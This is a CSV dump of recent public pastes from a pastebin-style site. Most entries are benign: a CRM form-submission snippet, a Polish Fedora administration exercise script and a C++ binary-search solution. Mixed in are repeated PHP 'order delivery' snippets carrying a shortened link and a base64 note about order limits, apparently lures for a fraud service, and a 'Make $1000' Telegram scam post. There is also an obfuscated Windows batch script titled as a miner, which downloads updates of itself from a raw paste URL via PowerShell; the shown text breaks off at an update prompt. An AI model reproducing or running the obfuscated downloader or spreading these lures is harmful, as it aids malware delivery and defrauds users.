id,title,username,language,date,content
Pcn5zGT5,Make $1000 15-MINUTES (BEGINNER) 77,lilmo1221,JavaScript,Friday 21st of March 2025 07:07:22 AM CDT," 
Tutorial: https://t.me/CurrentLeak/6

Enjoy

b2FS1vP9vS
"
wa7hJG6P,Order delivery script,nukrob01,PHP,Friday 21st of March 2025 07:05:27 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""850"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
x213VCuY,dataNone,TestGuy1,JSON,Friday 21st of March 2025 07:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'f86503402b625e82ec4f1f94f2b01334fc322dbd6a630c91e4cb24dc6d58603c451b72eb98008620bf4f49402765685e445723e9da9855c9697c7de40179323568eeef1bfdf120bc2c11644ef56ea8b9458a92fbbd628843ea6b9af605d77a3ecffefe0290e32d5e957ac3e43560ab97347b3daabcbc44d44908970ddc08bbb9',
  otherdata: [
    '289edc39600f94b030207ad048ac85cb',
    '3872c9cfba61d4ad976bd7a3a2f2b398',
    'b4e17a9657a480aa82f3e85b6cd67a7f',
    '94646482965d6f751ef7fd62b2718a4d',
    '73a887f2c895d8dde0181e286ec38b92',
    'a8ddfbe80d68253af76d558316560e86',
    'f5d17656cb83e6947d2b595bab129eb5',
    '79e0331d7dea6a34fc84447826f595bc'
  ]
}"
DjD8Ey1S,Untitled,sadwsadsdas,PHP,Friday 21st of March 2025 06:59:54 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""172"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
geeBe528,Untitled,sadwsadsdas,PHP,Friday 21st of March 2025 06:49:09 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""580"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
mFZeUA2B,Untitled,DarkVss,PHP,Friday 21st of March 2025 06:39:32 AM CDT,"        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HTTPHEADER, [""Content-Type: application/x-www-form-urlencoded;charset=utf-8""]);
        curl_setopt($ch, CURLOPT_URL, static::ENDPOINT . \Util\SystemConfig::getInstance()->CalltouchSiteID() . ""/register/"");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
                ""fio""         => urlencode($this->_name),
                ""phoneNumber"" => $this->_phone,
                ""email""       => $this->_email,
                ""subject""     => urlencode($this->_title),
                ""sessionId""   => $this->_visitCookie ?? ""nocookie"",
                ""comment""     => implode(""; "", $this->_comment) ?: ""Отсутствует"",
            ])
        );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = @curl_exec($ch);
        $info = @curl_getinfo($ch);
        curl_close($ch);

        return [
            ""curl_getinfo"" => $info,
            ""curl_exec""    => json_decode($response, true),
            ""url""          => static::ENDPOINT . \Util\SystemConfig::getInstance()->CalltouchSiteID() . ""/register/"",
            ""request""      => http_build_query([
                ""fio""         => urlencode($this->_name),
                ""phoneNumber"" => $this->_phone,
                ""email""       => $this->_email,
                ""subject""     => urlencode($this->_title),
                ""sessionId""   => $this->_visitCookie ?? ""nocookie"",
                ""comment""     => implode(""; "", $this->_comment) ?: ""Отсутствует"",
            ]),
        ];"
B06yhBDK,AutoDemping Plugin v1.3,ydwsxz,Python,Friday 21st of March 2025 06:34:28 AM CDT,728b0d0e04de29f6de8113a6a9e55bfc
fevzwNYC,sysop_v2_1.1.3&1.1.6,pan7nikt,Bash,Friday 21st of March 2025 06:23:43 AM CDT,"#1.1.3.1
echo -e '\033[0;32m-------1.1.3.1-------\033[0m'
dnf history list
dnf history info wybrany_numer | grep --color -E ""Action|$""

#1.1.3.2
echo -e '\033[0;32m-------1.1.3.2-------\033[0m'
df -h | grep --color -E ""użyte|dost.|/dev/mapper/fedora-root|$""
sudo dnf install -q -y @kde-desktop 

#1.1.3.3
echo -e '\033[0;32m-------1.1.3.3-------\033[0m'
dnf check-update
echo -e '\033[0;32mFiltrowanie:\ndnf updateinfo list --<security|bugfix|enhancement>\nlub\ndnf check-update --<security|bugfix|enhancement>\033[0m'
dnf updateinfo list --security | grep --color -E ""Type|$""

#1.1.3.4
echo -e '\033[0;32m-------1.1.3.4-------\033[0m'
sudo dnf upgrade --refresh kernel
echo -e '\033[0;32mWersje i wydania wszystkich zainstalowanych w systemie pakietów oprogramowania kernel:\033[0m'
rpm -q kernel

variable=""$(uname -r)"";wydanie=${variable#*.*.};wydanie=${wydanie%%.x86*};wersja=${variable%%-*};echo -e '\033[0;32mwersja i wydanie jądra systemu operacyjnego wczytanego do pamięci ulotnej\033[0m';echo -e '\033[0;32mWersja :\033[0m' $wersja;echo -e '\033[0;32mWydanie:\033[0m' $wydanie '\n'
uname -r

#1.1.6.1
#TERMINAL 1 (dowolny z su)
sudo dnf install @xfce-desktop-environment
#TERMINAL 2 (romek, f3, GNOME)
echo -e '\033[0;32m-------1.1.6.1 [ROMEK,GNOME]--------\033[0m';
chage -l romek
#TERMINAL 3 (atomek, f4, XFCE)
echo -e '\033[0;32m-------1.1.6.1 [ATOMEK,XFCE]--------\033[0m';
chage -l atomek
#TERMINAL 4 (romek, f3)
echo -e '\033[0;32m-------1.1.6.1 [TYTUS,CLI]--------\033[0m';
chage -l tytus

#1.1.6.2
echo -e '\033[0;32m-------1.1.6.2--------\nWszystkie konta należące do grupy użytkowników sysop:\033[0m';
getent group sysop;
echo -e '\033[0;32mWszystkie sesje użytkowników w systemie operacyjnym:\033[0m';
who;
echo -e '\033[0;32mCykl życia sesji użytkownika:\n1.\033[0m Logowanie – Uwierzytelnienie użytkownika i przypisanie sesji.\n\033[0;32m2.\033[0m Tworzenie środowiska – Uruchomienie powłoki lub GUI.\n\033[0;32m3.\033[0m Aktywna sesja – Wykonywanie operacji przez użytkownika.\n\033[0;32m4.\033[0m Zakończenie sesji – Wylogowanie, zamknięcie systemu lub zabicie procesów.\n\033[0;32m5.\033[0m Zwalnianie zasobów – Czyszczenie pamięci, zamykanie plików i zapis logów.\033[0m';

#1.1.6.3
#TERMINAL 1 (tytus, f5)
echo -e '\033[0;32m-------1.1.6.3 (stara sesja)--------\033[0m';
groups;
#TERMINAL 2 (dowolny z su)
echo -e '\033[0;32m-------1.1.6.3 (dodanie grupy)--------\033[0m'
sudo groupadd nowagrupa
sudo usermod -aG nowagrupa tytus
#TERMINAL 3 (tytus, f6)
echo -e '\033[0;32m-------1.1.6.3 (nowa sesja)--------\033[0m';
groups;"
tqpus7mq,Untitled,sookielove71,PHP,Friday 21st of March 2025 06:06:42 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""686"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
DXBks1p2,Untitled,Josif_tepe,C++,Friday 21st of March 2025 05:54:22 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
#include <cstring>
using namespace std;
typedef long long ll;
const int maxn = 1e5 + 100;
int n, l;
int a[maxn];
ll pref[maxn];

ll query(int i, int j) {
    if(i == 0) {
        return pref[j];
    }
    return pref[j] - pref[i - 1];
}

bool check(ll frogs) {
    for(int i = 0; i < n; i++) {
        if(i + l - 1 >= n) {
            return true;
        }
        if(query(i, i + l - 1) < frogs) {
            return false;
        }
        
    }
    return true;
}
int main() {
    ios_base::sync_with_stdio(false);
    cin >> n >> l;
    
    n--;
    ll sum = 0;
    for(int i = 0; i < n; i++) {
        cin >> a[i];
        
        sum += a[i];
        pref[i] = sum;
    }
    
    ll L = 0, R = 2e9;
    ll res= 0 ;
    while(L <= R) {
        ll mid = (L + R) / 2;
        
        if(check(mid)) {
            res = max(res, mid);
            L = mid + 1;
        }
        else {
            R = mid - 1;
        }
    }
    cout << res << endl;
    return 0;
}
"
XK7f88MF,Untitled,sookielove71,PHP,Friday 21st of March 2025 05:50:32 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""397"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
MWd8rH1N,MOD's miner,timmie140,Bash,Friday 21st of March 2025 05:49:15 AM CDT,"@echo off
Set a2m=lB765TptjrgehaVF0wz89you1AGvknmJEq2iPY4CUDdMsSWLIbfNxcXOR3ZKHQ
cls
@%a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% %a2m:~22,1%%a2m:~50,1%%a2m:~50,1%
%a2m:~44,1%%a2m:~11,1%%a2m:~7,1%%a2m:~0,1%%a2m:~22,1%%a2m:~53,1%%a2m:~13,1%%a2m:~0,1% %a2m:~11,1%%a2m:~29,1%%a2m:~13,1%%a2m:~49,1%%a2m:~0,1%%a2m:~11,1%%a2m:~42,1%%a2m:~11,1%%a2m:~0,1%%a2m:~13,1%%a2m:~21,1%%a2m:~11,1%%a2m:~42,1%%a2m:~11,1%%a2m:~52,1%%a2m:~6,1%%a2m:~13,1%%a2m:~29,1%%a2m:~44,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1%

:: ========================
:: %a2m:~25,1%%a2m:~23,1%%a2m:~7,1%%a2m:~22,1%-%a2m:~40,1%%a2m:~6,1%%a2m:~42,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1% %a2m:~39,1%%a2m:~22,1%%a2m:~29,1%%a2m:~50,1%%a2m:~35,1%%a2m:~10,1%%a2m:~23,1%%a2m:~9,1%%a2m:~13,1%%a2m:~7,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1%
:: ========================
%a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~53,1%%a2m:~23,1%%a2m:~9,1%%a2m:~9,1%%a2m:~11,1%%a2m:~29,1%%a2m:~7,1%_%a2m:~27,1%%a2m:~11,1%%a2m:~9,1%%a2m:~44,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1%=%a2m:~16,1%.%a2m:~16,1%.%a2m:~24,1%""
%a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~23,1%%a2m:~6,1%%a2m:~42,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%_%a2m:~23,1%%a2m:~9,1%%a2m:~0,1%=%a2m:~12,1%%a2m:~7,1%%a2m:~7,1%%a2m:~6,1%%a2m:~44,1%://%a2m:~6,1%%a2m:~13,1%%a2m:~44,1%%a2m:~7,1%%a2m:~11,1%%a2m:~49,1%%a2m:~35,1%%a2m:~29,1%.%a2m:~53,1%%a2m:~22,1%%a2m:~30,1%/%a2m:~9,1%%a2m:~13,1%%a2m:~17,1%/%a2m:~43,1%%a2m:~46,1%%a2m:~42,1%%a2m:~19,1%%a2m:~9,1%%a2m:~60,1%%a2m:~24,1%%a2m:~51,1%""
%a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~44,1%%a2m:~11,1%%a2m:~0,1%%a2m:~50,1%_%a2m:~6,1%%a2m:~13,1%%a2m:~7,1%%a2m:~12,1%=%~%a2m:~50,1%%a2m:~16,1%""
%a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~13,1%%a2m:~23,1%%a2m:~7,1%%a2m:~22,1%_%a2m:~23,1%%a2m:~6,1%%a2m:~42,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%=%a2m:~50,1%%a2m:~13,1%%a2m:~0,1%%a2m:~44,1%%a2m:~11,1%""

:: %a2m:~14,1%%a2m:~11,1%%a2m:~9,1%%a2m:~44,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1% %a2m:~53,1%%a2m:~22,1%%a2m:~30,1%%a2m:~6,1%%a2m:~13,1%%a2m:~9,1%%a2m:~35,1%%a2m:~44,1%%a2m:~22,1%%a2m:~29,1% %a2m:~50,1%%a2m:~23,1%%a2m:~29,1%%a2m:~53,1%%a2m:~7,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1%
:%a2m:~53,1%%a2m:~22,1%%a2m:~30,1%%a2m:~6,1%%a2m:~13,1%%a2m:~9,1%%a2m:~11,1%_%a2m:~27,1%%a2m:~11,1%%a2m:~9,1%%a2m:~44,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1%%a2m:~44,1%
%a2m:~44,1%%a2m:~11,1%%a2m:~7,1%%a2m:~0,1%%a2m:~22,1%%a2m:~53,1%%a2m:~13,1%%a2m:~0,1%
%a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~27,1%%a2m:~24,1%=%~%a2m:~24,1%""
%a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~27,1%%a2m:~34,1%=%~%a2m:~34,1%""

%a2m:~50,1%%a2m:~22,1%%a2m:~9,1% /%a2m:~50,1% ""%a2m:~7,1%%a2m:~22,1%%a2m:~28,1%%a2m:~11,1%%a2m:~29,1%%a2m:~44,1%=%a2m:~24,1%-%a2m:~57,1% %a2m:~42,1%%a2m:~11,1%%a2m:~0,1%%a2m:~35,1%%a2m:~30,1%%a2m:~44,1%=."" %%%a2m:~13,1% %a2m:~35,1%%a2m:~29,1% (""%%a2m:~27,1%%a2m:~24,1%%"") %a2m:~42,1%%a2m:~22,1% (
    %a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~27,1%%a2m:~24,1%_%a2m:~30,1%%a2m:~13,1%%a2m:~8,1%%a2m:~22,1%%a2m:~9,1%=%%%a2m:~13,1%""
    %a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~27,1%%a2m:~24,1%_%a2m:~30,1%%a2m:~35,1%%a2m:~29,1%%a2m:~22,1%%a2m:~9,1%=%%%a2m:~49,1%""
    %a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~27,1%%a2m:~24,1%_%a2m:~6,1%%a2m:~13,1%%a2m:~7,1%%a2m:~53,1%%a2m:~12,1%=%%%a2m:~53,1%""
)

%a2m:~50,1%%a2m:~22,1%%a2m:~9,1% /%a2m:~50,1% ""%a2m:~7,1%%a2m:~22,1%%a2m:~28,1%%a2m:~11,1%%a2m:~29,1%%a2m:~44,1%=%a2m:~24,1%-%a2m:~57,1% %a2m:~42,1%%a2m:~11,1%%a2m:~0,1%%a2m:~35,1%%a2m:~30,1%%a2m:~44,1%=."" %%%a2m:~13,1% %a2m:~35,1%%a2m:~29,1% (""%%a2m:~27,1%%a2m:~34,1%%"") %a2m:~42,1%%a2m:~22,1% (
    %a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~27,1%%a2m:~34,1%_%a2m:~30,1%%a2m:~13,1%%a2m:~8,1%%a2m:~22,1%%a2m:~9,1%=%%%a2m:~13,1%""
    %a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~27,1%%a2m:~34,1%_%a2m:~30,1%%a2m:~35,1%%a2m:~29,1%%a2m:~22,1%%a2m:~9,1%=%%%a2m:~49,1%""
    %a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~27,1%%a2m:~34,1%_%a2m:~6,1%%a2m:~13,1%%a2m:~7,1%%a2m:~53,1%%a2m:~12,1%=%%%a2m:~53,1%""
)

%a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~29,1%%a2m:~11,1%%a2m:~17,1%%a2m:~11,1%%a2m:~9,1%=%a2m:~50,1%%a2m:~13,1%%a2m:~0,1%%a2m:~44,1%%a2m:~11,1%""
%a2m:~35,1%%a2m:~50,1% %%a2m:~27,1%%a2m:~34,1%_%a2m:~30,1%%a2m:~13,1%%a2m:~8,1%%a2m:~22,1%%a2m:~9,1%% %a2m:~10,1%%a2m:~7,1%%a2m:~9,1% %%a2m:~27,1%%a2m:~24,1%_%a2m:~30,1%%a2m:~13,1%%a2m:~8,1%%a2m:~22,1%%a2m:~9,1%% %a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~29,1%%a2m:~11,1%%a2m:~17,1%%a2m:~11,1%%a2m:~9,1%=%a2m:~7,1%%a2m:~9,1%%a2m:~23,1%%a2m:~11,1%""
%a2m:~35,1%%a2m:~50,1% %%a2m:~27,1%%a2m:~34,1%_%a2m:~30,1%%a2m:~13,1%%a2m:~8,1%%a2m:~22,1%%a2m:~9,1%% %a2m:~11,1%%a2m:~33,1%%a2m:~23,1% %%a2m:~27,1%%a2m:~24,1%_%a2m:~30,1%%a2m:~13,1%%a2m:~8,1%%a2m:~22,1%%a2m:~9,1%% (
    %a2m:~35,1%%a2m:~50,1% %%a2m:~27,1%%a2m:~34,1%_%a2m:~30,1%%a2m:~35,1%%a2m:~29,1%%a2m:~22,1%%a2m:~9,1%% %a2m:~10,1%%a2m:~7,1%%a2m:~9,1% %%a2m:~27,1%%a2m:~24,1%_%a2m:~30,1%%a2m:~35,1%%a2m:~29,1%%a2m:~22,1%%a2m:~9,1%% %a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~29,1%%a2m:~11,1%%a2m:~17,1%%a2m:~11,1%%a2m:~9,1%=%a2m:~7,1%%a2m:~9,1%%a2m:~23,1%%a2m:~11,1%""
    %a2m:~35,1%%a2m:~50,1% %%a2m:~27,1%%a2m:~34,1%_%a2m:~30,1%%a2m:~35,1%%a2m:~29,1%%a2m:~22,1%%a2m:~9,1%% %a2m:~11,1%%a2m:~33,1%%a2m:~23,1% %%a2m:~27,1%%a2m:~24,1%_%a2m:~30,1%%a2m:~35,1%%a2m:~29,1%%a2m:~22,1%%a2m:~9,1%% (
        %a2m:~35,1%%a2m:~50,1% %%a2m:~27,1%%a2m:~34,1%_%a2m:~6,1%%a2m:~13,1%%a2m:~7,1%%a2m:~53,1%%a2m:~12,1%% %a2m:~10,1%%a2m:~7,1%%a2m:~9,1% %%a2m:~27,1%%a2m:~24,1%_%a2m:~6,1%%a2m:~13,1%%a2m:~7,1%%a2m:~53,1%%a2m:~12,1%% %a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~29,1%%a2m:~11,1%%a2m:~17,1%%a2m:~11,1%%a2m:~9,1%=%a2m:~7,1%%a2m:~9,1%%a2m:~23,1%%a2m:~11,1%""
    )
)
%a2m:~11,1%%a2m:~29,1%%a2m:~42,1%%a2m:~0,1%%a2m:~22,1%%a2m:~53,1%%a2m:~13,1%%a2m:~0,1% & %a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~29,1%%a2m:~11,1%%a2m:~17,1%%a2m:~11,1%%a2m:~9,1%=%%a2m:~29,1%%a2m:~11,1%%a2m:~17,1%%a2m:~11,1%%a2m:~9,1%%""
%a2m:~10,1%%a2m:~22,1%%a2m:~7,1%%a2m:~22,1% :%a2m:~32,1%%a2m:~55,1%%a2m:~15,1%

:: %a2m:~39,1%%a2m:~12,1%%a2m:~11,1%%a2m:~53,1%%a2m:~28,1% %a2m:~50,1%%a2m:~22,1%%a2m:~9,1% %a2m:~23,1%%a2m:~6,1%%a2m:~42,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%%a2m:~44,1%
:%a2m:~53,1%%a2m:~12,1%%a2m:~11,1%%a2m:~53,1%%a2m:~28,1%_%a2m:~23,1%%a2m:~6,1%%a2m:~42,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%%a2m:~44,1%
%a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% %a2m:~39,1%%a2m:~12,1%%a2m:~11,1%%a2m:~53,1%%a2m:~28,1%%a2m:~35,1%%a2m:~29,1%%a2m:~10,1% %a2m:~50,1%%a2m:~22,1%%a2m:~9,1% %a2m:~23,1%%a2m:~6,1%%a2m:~42,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%%a2m:~44,1%...
%a2m:~6,1%%a2m:~22,1%%a2m:~17,1%%a2m:~11,1%%a2m:~9,1%%a2m:~44,1%%a2m:~12,1%%a2m:~11,1%%a2m:~0,1%%a2m:~0,1% -%a2m:~39,1%%a2m:~22,1%%a2m:~30,1%%a2m:~30,1%%a2m:~13,1%%a2m:~29,1%%a2m:~42,1% ""%a2m:~48,1%%a2m:~29,1%%a2m:~27,1%%a2m:~22,1%%a2m:~28,1%%a2m:~11,1%-%a2m:~46,1%%a2m:~11,1%%a2m:~49,1%%a2m:~56,1%%a2m:~11,1%%a2m:~33,1%%a2m:~23,1%%a2m:~11,1%%a2m:~44,1%%a2m:~7,1% '%%a2m:~23,1%%a2m:~6,1%%a2m:~42,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%_%a2m:~23,1%%a2m:~9,1%%a2m:~0,1%%' -%a2m:~55,1%%a2m:~23,1%%a2m:~7,1%%a2m:~15,1%%a2m:~35,1%%a2m:~0,1%%a2m:~11,1% '%%a2m:~7,1%%a2m:~11,1%%a2m:~30,1%%a2m:~6,1%%\%a2m:~23,1%%a2m:~6,1%%a2m:~42,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%_%a2m:~53,1%%a2m:~12,1%%a2m:~11,1%%a2m:~53,1%%a2m:~28,1%.%a2m:~7,1%%a2m:~30,1%%a2m:~6,1%'""
%a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~0,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%%a2m:~44,1%%a2m:~7,1%_%a2m:~27,1%%a2m:~11,1%%a2m:~9,1%%a2m:~44,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1%=%a2m:~16,1%.%a2m:~16,1%.%a2m:~16,1%""
%a2m:~50,1%%a2m:~22,1%%a2m:~9,1% /%a2m:~50,1% ""%a2m:~7,1%%a2m:~22,1%%a2m:~28,1%%a2m:~11,1%%a2m:~29,1%%a2m:~44,1%=%a2m:~34,1% %a2m:~42,1%%a2m:~11,1%%a2m:~0,1%%a2m:~35,1%%a2m:~30,1%%a2m:~44,1%=="" %%%a2m:~35,1% %a2m:~35,1%%a2m:~29,1% ('%a2m:~50,1%%a2m:~35,1%%a2m:~29,1%%a2m:~42,1%%a2m:~44,1%%a2m:~7,1%%a2m:~9,1% /%a2m:~49,1% /%a2m:~53,1%:""%a2m:~44,1%%a2m:~11,1%%a2m:~7,1% \""%a2m:~53,1%%a2m:~23,1%%a2m:~9,1%%a2m:~9,1%%a2m:~11,1%%a2m:~29,1%%a2m:~7,1%_%a2m:~27,1%%a2m:~11,1%%a2m:~9,1%%a2m:~44,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1%="" ""%%a2m:~7,1%%a2m:~11,1%%a2m:~30,1%%a2m:~6,1%%\%a2m:~23,1%%a2m:~6,1%%a2m:~42,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%_%a2m:~53,1%%a2m:~12,1%%a2m:~11,1%%a2m:~53,1%%a2m:~28,1%.%a2m:~7,1%%a2m:~30,1%%a2m:~6,1%""') %a2m:~42,1%%a2m:~22,1% (
    %a2m:~44,1%%a2m:~11,1%%a2m:~7,1% ""%a2m:~0,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%%a2m:~44,1%%a2m:~7,1%_%a2m:~27,1%%a2m:~11,1%%a2m:~9,1%%a2m:~44,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1%=%%~%a2m:~35,1%""
)

%a2m:~53,1%%a2m:~13,1%%a2m:~0,1%%a2m:~0,1% :%a2m:~53,1%%a2m:~22,1%%a2m:~30,1%%a2m:~6,1%%a2m:~13,1%%a2m:~9,1%%a2m:~11,1%_%a2m:~27,1%%a2m:~11,1%%a2m:~9,1%%a2m:~44,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1%%a2m:~44,1% %%a2m:~53,1%%a2m:~23,1%%a2m:~9,1%%a2m:~9,1%%a2m:~11,1%%a2m:~29,1%%a2m:~7,1%_%a2m:~27,1%%a2m:~11,1%%a2m:~9,1%%a2m:~44,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1%% %%a2m:~0,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%%a2m:~44,1%%a2m:~7,1%_%a2m:~27,1%%a2m:~11,1%%a2m:~9,1%%a2m:~44,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1%%
%a2m:~35,1%%a2m:~50,1% ""%%a2m:~29,1%%a2m:~11,1%%a2m:~17,1%%a2m:~11,1%%a2m:~9,1%%""==""%a2m:~7,1%%a2m:~9,1%%a2m:~23,1%%a2m:~11,1%"" (
    %a2m:~11,1%%a2m:~53,1%%a2m:~12,1%%a2m:~22,1% %a2m:~51,1%%a2m:~11,1%%a2m:~17,1% %a2m:~27,1%%a2m:~11,1%%a2m:~9,1%%a2m:~44,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1% %a2m:~13,1%%a2m:~27,1%%a2m:~13,1%%a2m:~35,1%%a2m:~0,1%%a2m:~13,1%%a2m:~49,1%%a2m:~0,1%%a2m:~11,1%: %%a2m:~0,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%%a2m:~44,1%%a2m:~7,1%_%a2m:~27,1%%a2m:~11,1%%a2m:~9,1%%a2m:~44,1%%a2m:~35,1%%a2m:~22,1%%a2m:~29,1%%
    %a2m:~53,1%%a2m:~12,1%%a2m:~22,1%%a2m:~35,1%%a2m:~53,1%%a2m:~11,1% /%a2m:~53,1% %a2m:~37,1%%a2m:~51,1%%a2m:~25,1% /%a2m:~30,1% ""%a2m:~40,1%%a2m:~6,1%%a2m:~42,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1%? [%a2m:~37,1%]%a2m:~11,1%%a2m:~44,1%, [%a2m:~51,1%]%a2m:~22,1%, [%a2m:~25,1%]%a2m:~23,1%%a2m:~7,1%%a2m:~22,1%-%a2m:~23,1%%a2m:~6,1%%a2m:~42,1%%a2m:~13,1%%a2m:~7,1%%a2m:~11,1% (%a2m:~13,1%%a2m:~0,1%%a2m:~17,1%%a2m:~13,1%%a2m:~21,1%%a2m:~44,1% %a2m:~21,1%%a2m:~11,1%%a2m:~44,1%)""
    %a2m:~35,1%%a2m:~50,1% %a2m:~11,1%%a2m:~9,1%%a2m:~9,1%%a2m:~22,1%%a2m:~9,1%%a2m:~0,1%%a2m:~11,1%%a2m:~27,1%%a2m:~11,1%%a2m:~0,1% %a2m:~57,1% (
